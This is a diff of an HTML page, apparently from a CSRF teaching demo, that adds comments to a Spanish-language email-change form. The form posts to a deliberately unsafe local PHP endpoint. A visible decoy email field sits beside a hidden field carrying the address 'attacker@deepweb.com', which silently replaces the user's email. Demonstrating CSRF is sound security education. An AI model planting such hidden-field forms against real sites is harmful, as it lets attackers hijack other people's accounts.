@@ -1,12 +1,28 @@
+<!--
+Website created by Carlos Chacón Molina
+
+Form with a CSRF Exploit pointing to a vulnerable PHP
+-->
 <head>
         <link rel="stylesheet" href="style.css">
 </head>
 <body>
+        <!--
+        Form with a CSRF Exploit
+        -->
         <div class="form">
                 <h4>Cambio de correo electrónico:</h4>
                 <form method="post" action="./api/UnsafeIndex.php">
                         <label for="notemail">Nuevo Email:</label>
+
+                        <!--
+                        Fake input for the user email
+                        -->
                         <input type="text" size="40" name="notemail">
+                        
+                        <!--
+                        Hidden input with the attacker Email
+                        -->
                         <input type="hidden" value="attacker@deepweb.com" name="email">
                         <br>
                         <button type="submit">Enviar</button>
